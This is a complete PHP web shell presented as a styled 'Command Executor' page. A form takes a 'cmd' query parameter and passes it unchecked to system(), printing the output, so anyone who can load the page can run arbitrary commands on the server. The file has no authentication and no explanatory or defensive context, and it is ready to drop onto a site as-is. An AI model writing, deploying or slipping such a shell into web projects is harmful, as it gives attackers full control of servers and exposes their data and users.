<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Executor</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            text-align: center;
            background: #ffffff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"] {
            width: 70%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            margin-bottom: 10px;
            font-size: 16px;
        }
        input[type="submit"] {
            padding: 10px 20px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }
        input[type="submit"]:hover {
            background: #0056b3;
        }
        pre {
            text-align: left;
            background: #f8f9fa;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            overflow: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Command Executor</h2>
        <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="text" name="cmd" autofocus id="cmd" size="80" placeholder="Enter your command here">
            <br>
            <input type="submit" value="Execute">
        </form>
        <pre>
<?php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
        </pre>
    </div>
</body>
</html>
